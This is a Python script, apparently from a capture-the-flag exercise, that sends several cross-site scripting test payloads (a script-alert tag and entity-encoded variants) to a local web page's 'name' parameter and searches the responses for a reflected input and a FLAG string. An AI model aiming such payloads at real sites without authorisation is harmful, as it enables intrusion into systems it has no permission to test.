import requests
import re

target = "http://127.0.0.1:32889/page"

# Test different payload types to understand the application behavior
test_cases = [
    ("Normal text", "Hello World"),
    ("Empty", ""),
    ("Special chars", "!@#$%^&*()"),
    ("HTML entities benign", "&lt;b&gt;test&lt;/b&gt;"),
    ("Script blocked", "<script>alert(1)</script>"),
    ("Script encoded simple", "&lt;script&gt;alert(1)&lt;/script&gt;"),
    ("Script encoded complex", "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;alert(1)&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;"),
]

print("Testing different payload types to understand application behavior...")
print("="*80)

for name, payload in test_cases:
    try:
        response = requests.get(target, params={'name': payload}, timeout=5)
        
        print(f"\n[{name}]")
        print(f"Payload: {payload}")
        print(f"Status: {response.status_code} | Length: {len(response.content)} bytes")
        
        # Check solution div
        match = re.search(r'<div class="solution-text">(.*?)</div>', response.text, re.DOTALL)
        if match:
            solution_content = match.group(1).strip()
            print(f"Solution div content: {solution_content[:200]}")
        
        # Check for flag
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"*** FLAG FOUND: {flags[0]} ***")
        
        # Check input reflection
        input_match = re.search(r'<input[^>]*>([^<]*)', response.text)
        if input_match:
            print(f"Input reflection: {input_match.group(1)[:100]}")
            
    except Exception as e:
        print(f"ERROR: {str(e)}")

print("\n" + "="*80)

